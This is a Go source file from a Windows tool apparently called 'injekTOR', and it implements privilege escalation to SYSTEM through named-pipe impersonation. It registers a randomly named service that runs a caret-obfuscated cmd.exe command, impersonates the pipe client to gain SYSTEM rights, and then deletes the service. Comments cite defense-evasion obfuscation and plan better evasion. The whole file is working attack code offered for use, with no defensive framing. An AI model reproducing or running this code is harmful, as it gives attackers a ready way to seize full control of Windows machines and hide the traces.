package getSystem

// +build windows,amd64

import (
"fmt"
"injekTOR/infos"
"math/rand"
"strings"
"syscall"
"time"
"unsafe"
)

type SERVICE_STATUS_PROCESS struct {
	dwServiceType             uint32
	dwCurrentState            uint32
	dwControlsAccepted        uint32
	dwWin32ExitCode           uint32
	dwServiceSpecificExitCode uint32
	dwCheckPoint              uint32
	dwWaitHint                uint32
	dwProcessId               uint32
	dwServiceFlags            uint32
}

const(
	PIPE_ACCESS_DUPLEX = 0x00000003
	PIPE_TYPE_MESSAGE = 0x00000004
	PIPE_WAIT = 0x00000000
	SC_MANAGER_ALL_ACCESS = 0xF003F
	SERVICE_WIN32_OWN_PROCESS = 0x10
	SERVICE_DEMAND_START = 0x3
	SERVICE_ERROR_NORMAL = 0x1
)

func errno(e1 error) error {
	if e1, ok := e1.(syscall.Errno); ok && e1 == 0 {
		e1 = syscall.EINVAL
	}
	return e1
}


func RandStringBytes() string {
	var letterBytes = "abcdefghijklmnopqrstuvwxyz0123456789"

	// random int:
	rand.Seed(time.Now().UnixNano())
	n := rand.Intn(255-5) + 5

	b := make([]byte, n)
	for i := range b {
		b[i] = letterBytes[rand.Intn(len(letterBytes))]
	}
	return string(b)
}

func StringToCharPtr(str string) *uint8 {
	chars := append([]byte(str), 0) // null terminated
	return &chars[0]
}

func CreateNamedPipeA(pipeName string)(pipeHandle uintptr, err error){
	// https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea
	// LPCSTR & LPSTR & LPWSTR & LPCWSTR:
	//https://www.thesubtlety.com/post/getting-started-golang-windows-apis/

	var (
		kernel32 = syscall.NewLazyDLL("kernel32.dll")
		CreateNamedPipeA = kernel32.NewProc("CreateNamedPipeA")
	)

	var pipeNameLPCSTR = StringToCharPtr("\\\\.\\pipe\\" + pipeName)


	r1, _, e1 := CreateNamedPipeA.Call(
		uintptr(unsafe.Pointer(pipeNameLPCSTR)),
		uintptr(PIPE_ACCESS_DUPLEX),
		uintptr(PIPE_TYPE_MESSAGE | PIPE_WAIT),
		uintptr(1),
		uintptr(2048),
		uintptr(2048),
		uintptr(0),
		uintptr(unsafe.Pointer(nil)),
	)
	if r1==0 {
		err = errno(e1)
	}

	return r1, err
}

func OpenSCManagerA()(serviceControlManagerDbHandle uintptr,err error){
	/*
		  https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagera
		  SC_HANDLE OpenSCManagerA(
		  LPCSTR lpMachineName, computer name, NULL is localhost
		  LPCSTR lpDatabaseName,
		  DWORD  dwDesiredAccess
		);
	*/

	var (
		advapi32 = syscall.NewLazyDLL("Advapi32.dll")
		OpenSCManagerA = advapi32.NewProc("OpenSCManagerA")
	)

	r1, _, e1 := OpenSCManagerA.Call(
		0,
		0,
		SC_MANAGER_ALL_ACCESS,
	)

	if r1==0 {
		err = errno(e1)
	}

	return r1, err
}

func CreateServiceA(serviceControlManagerDbHandle uintptr, serviceName string, pipeName string)(serviceHandle uintptr, err error){
	// https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea
	// https://www.ired.team/offensive-security/defense-evasion/commandline-obfusaction

	var (
		advapi32 = syscall.NewLazyDLL("Advapi32.dll")
		CreateServiceA = advapi32.NewProc("CreateServiceA")
	)


	// var commandToRun = StringToCharPtr("%COMSPEC% /V /C start %COMSPEC% /V /C \"timeout /t 3 >nul && set abc=\\\\.\\pipe\\TOTO && echo ServiceNameToRandomize > !abc!")
	// variable serviceName, and "^" are used to "obfusacte" the command

	var commandToRun = StringToCharPtr("%COMSPEC% /V /C s^ta^rt %COMSPEC% /V /C \"timeout /t 3 >nul && s^et "+serviceName+"=\\\\.\\pi^pe\\" + pipeName + " && ec^h^o "+ pipeName +" > !"+serviceName+"!")
	//var commandToRun =  StringToCharPtr(fmt.Sprintf("cmd.exe /c echo test > \\\\.\\pipe\\%s", pipeName))

	r1, _, e1 := CreateServiceA.Call(
		serviceControlManagerDbHandle,
		uintptr(unsafe.Pointer(StringToCharPtr(serviceName))),
		uintptr(unsafe.Pointer(StringToCharPtr(serviceName))),
		SC_MANAGER_ALL_ACCESS,
		SERVICE_WIN32_OWN_PROCESS,
		SERVICE_DEMAND_START,
		SERVICE_ERROR_NORMAL,
		uintptr(unsafe.Pointer(commandToRun)),
		0,
		0,
		0,
		0,
		0,
	)

	if r1==0 {
		err = errno(e1)
	}

	return r1, err
}

func CloseServiceHandle(serviceHandle uintptr)(err error){
	// https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-closeservicehandle

	var (
		advapi32 = syscall.NewLazyDLL("Advapi32.dll")
		CloseServiceHandle = advapi32.NewProc("CloseServiceHandle")
	)
	r1, _, e1 := CloseServiceHandle.Call(serviceHandle)

	if r1==0 {
		err = errno(e1)
	}

	return err
}

func OpenServiceA(serviceControlManagerDbHandle uintptr, serviceName string)(serviceHandle uintptr, err error){

	//https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openservicea
	var (
		advapi32 = syscall.NewLazyDLL("Advapi32.dll")
		OpenServiceA = advapi32.NewProc("OpenServiceA")
	)


	r1, _, e1 := OpenServiceA.Call(
		serviceControlManagerDbHandle,
		uintptr(unsafe.Pointer(StringToCharPtr(serviceName))),
		SC_MANAGER_ALL_ACCESS,
	)

	if r1==0 {
		err = errno(e1)
	}

	return  r1, err

}

func StartServiceA(serviceHandle uintptr)(err error){

	// https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicea

	var (
		advapi32 = syscall.NewLazyDLL("Advapi32.dll")
		StartServiceA = advapi32.NewProc("StartServiceA")
	)

	r1, _, e1 := StartServiceA.Call(
		serviceHandle,
		0,
		0,
	)

	// Due to the fact that the command is not launching a service, there is a good chance that the call to StartServiceA will trigger this error.
	if int(e1.(syscall.Errno)) == 1053{
		fmt.Println("Error 1053 reached... Keep going.")
		r1, err = 1, nil
	}

	if r1==0 {
		fmt.Println(e1)
		err = errno(e1)
	}

	return err
}

func WaitNamedPipeA(pipeName string)(){
	var (
		kernel32       = syscall.NewLazyDLL("kernel32.dll")
		WaitNamedPipeA = kernel32.NewProc("WaitNamedPipeA")
	)

	//async call wait for pipe connection:
	r1, _, e1 := WaitNamedPipeA.Call(
		uintptr(unsafe.Pointer(StringToCharPtr(pipeName))),
		0, //removed infiite wait since we use golang defer instruction
	)

	if r1==0 {
		fmt.Println("Pipe waiting error : ", errno(e1))
	}else{
		fmt.Println("Pipe waiting started")
	}

}

func ReadPipe(pipeHandle uintptr)(data string, err error){

	// a.k.a ReadFile

	var (
		kernel32 = syscall.NewLazyDLL("kernel32.dll")
		ReadFile = kernel32.NewProc("ReadFile")
	)

	var buffer [2048]byte
	var lpcbNeeded uint32

	r1, _, e1 := ReadFile.Call(
		pipeHandle,
		uintptr(unsafe.Pointer(&buffer[0])),
		2048*unsafe.Sizeof(data[0]),
		uintptr(unsafe.Pointer(&lpcbNeeded)),
		0,
	)

	if r1==0 {
		err = errno(e1)
	}else{
		fmt.Println("Pipe waiting started...")
	}

	return strings.ReplaceAll(string(buffer[:]), string(0x00), ""), err
}


func ImpersonateNamedPipeClient(pipeHandle uintptr)(err error){

	var (
		advapi32 = syscall.NewLazyDLL("Advapi32.dll")
		ImpersonateNamedPipeClient = advapi32.NewProc("ImpersonateNamedPipeClient")
	)

	r1, _, e1 := ImpersonateNamedPipeClient.Call(
		pipeHandle,
	)

	if r1 == 0{
		err = errno(e1)
	}
	return err
}

func QueryServiceStatusEx(serviceHandle uintptr)(err error){
	// https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-queryservicestatusex

	var (
		advapi32 = syscall.NewLazyDLL("Advapi32.dll")
		QueryServiceStatusEx = advapi32.NewProc("QueryServiceStatusEx")
	)

	var processState SERVICE_STATUS_PROCESS

	//var lpBuffer [2048]byte
	var byteNeeded uint32

	r1, _, e1 := QueryServiceStatusEx.Call(
		serviceHandle,
		0,
		uintptr(unsafe.Pointer(&processState)),
		2048,
		uintptr(unsafe.Pointer(&byteNeeded)),
	)

	/*

		SERVICE_STOPPED          = 1
		SERVICE_START_PENDING    = 2
		SERVICE_STOP_PENDING     = 3
		SERVICE_RUNNING          = 4
		SERVICE_CONTINUE_PENDING = 5
		SERVICE_PAUSE_PENDING    = 6
		SERVICE_PAUSED           = 7
		SERVICE_NO_CHANGE        = 0xffffffff
	*/

	if r1==0 {
		err = errno(e1)
	}

	return err
}

func DeleteService(serviceHandle uintptr)(err error){
	// https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-deleteservice

	var (
		advapi32 = syscall.NewLazyDLL("Advapi32.dll")
		DeleteService = advapi32.NewProc("DeleteService")
	)

	r1, _, e1 := DeleteService.Call(
		serviceHandle,
	)

	if r1==0 {
		err = errno(e1)
	}

	return err

}

func RevertToSelf()(err error){
	var (
		advapi32 = syscall.NewLazyDLL("Advapi32.dll")
		RevertToSelf = advapi32.NewProc("RevertToSelf")
	)

	r1, _, e1 := RevertToSelf.Call()

	if r1==0 {
		err = errno(e1)
	}

	return err
}

func Get_system_namedpipe_service()(success bool){
	success = false
	var serviceName = RandStringBytes()
	var pipeName = RandStringBytes()

	pipeHandle, errCreateNamedPipeA := CreateNamedPipeA(pipeName)
	if errCreateNamedPipeA == nil {

		serviceControlManagerHandle, errOpenSCManagerA := OpenSCManagerA()
		if errOpenSCManagerA == nil{

			serviceHandle, errCreateServiceA := CreateServiceA(serviceControlManagerHandle, serviceName,pipeName)
			if errCreateServiceA == nil{

				errCloseServiceHandle := CloseServiceHandle(serviceHandle)

				if errCloseServiceHandle == nil{

					serviceHandle, errOpenServiceA := OpenServiceA(serviceControlManagerHandle, serviceName)

					if errOpenServiceA == nil{

						errStartServiceA := StartServiceA(serviceHandle)

						if errStartServiceA == nil{

							fmt.Println("Sleeping 5 second to let the service start...")
							time.Sleep(5 * time.Second)
							defer WaitNamedPipeA("\\\\.\\pipe\\" + pipeName)

							pipeData, errReadFile := ReadPipe(pipeHandle)

							if errReadFile == nil{

								fmt.Println("Data read from the pipe: ", pipeData)
								errImpersonateNamedPipeClient := ImpersonateNamedPipeClient(pipeHandle)

								if errImpersonateNamedPipeClient == nil{

									fmt.Println("Current user is now :", infos.GetCurrentUser())
									success = true

								}else{
									fmt.Println("ImpersonateNamedPipeClient() error: ", errImpersonateNamedPipeClient)
								}

							}else{
								fmt.Println("Readfile error: ", errReadFile)
							}

						}else{
							fmt.Println("StartServiceA() error: ", errStartServiceA)
						}

						// Cleaning:
						fmt.Println("Started cleanup...")

						errDeleteService := DeleteService(serviceHandle)
						if errDeleteService == nil{
							fmt.Println("Deleted service successfully.")
						}else{
							fmt.Println("Error while deleting the service: ", errDeleteService)
						}



						errCloseServiceHandle := CloseServiceHandle(serviceHandle)
						if errCloseServiceHandle == nil{
							fmt.Println("Closed service handle successfully.")
						}else{
							fmt.Println("Error while closing the service handle: ", errCloseServiceHandle)
						}

					}else{
						fmt.Println("OpenServiceA() error: ", errOpenServiceA)
					}

				}else{
					fmt.Println("CloseServiceHandle() error:",errCloseServiceHandle)
				}

			}else{
				fmt.Println("CreateServiceA() error:", errCreateServiceA)
			}

			//Cleaning:
			errCloseServiceHandle := CloseServiceHandle(serviceControlManagerHandle)
			if errCloseServiceHandle == nil{
				fmt.Println("Deleted service controlManager handle successfully.")
			}else{
				fmt.Println("Error while deleting the service controlManager handle: ", errCloseServiceHandle)
			}

		}else{
			fmt.Println("OpenSCManagerA() error:",errOpenSCManagerA)
		}

	}else{
		fmt.Println("CreateNamedPipeA() error:", errCreateNamedPipeA)
	}
	return success
}


func Get_system_test() {


	if Get_system_namedpipe_service() == true {
		fmt.Println("Get_system_namedpipe_service() success!")
	}else{
		fmt.Println("Get_system_namedpipe_service() error!")
	}

	errRevertToSelf := RevertToSelf()
	if errRevertToSelf == nil{
		fmt.Println("RevertToSelf() success. Current user is now :", infos.GetCurrentUser())
	}else{
		fmt.Println("RevertToSelf() error: ", errRevertToSelf)
	}

	//To do:
	// better cmd.exe command obfuscation
	// Huan Github

}